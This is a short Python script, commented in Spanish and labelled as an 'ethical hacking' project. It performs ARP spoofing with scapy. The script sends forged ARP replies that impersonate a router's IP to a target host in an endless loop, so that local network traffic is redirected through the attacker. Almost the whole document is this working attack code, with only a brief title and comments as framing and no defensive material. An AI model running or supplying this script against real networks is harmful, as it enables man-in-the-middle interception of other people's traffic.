'''
PROYECTOS DE HACKING ETICO WITH PYTHON
ARP SPOOFING
'''
# Este proyecto implica realizar un ataque ARP Spoofing para redirigir el tráfico en una red local.

# Utiliza la biblioteca scapy para manipular las respuestas ARP.

from scapy.all import ARP, Ether, send
import time

# Función para enviar paquetes ARP falsos
def arp_spoof(target_ip, spoof_ip):
    # Crear el paquete ARP
    arp_response = ARP(op=2, pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip)
    send(arp_response, verbose=0)

# Ejemplo de uso
target_ip = "192.168.1.5"  # IP del objetivo
spoof_ip = "192.168.1.1"    # IP del router
try:
    while True:
        arp_spoof(target_ip, spoof_ip)
        time.sleep(2)  # Esperar 2 segundos entre cada paquete
except KeyboardInterrupt:
    print("Detenido por el usuario.")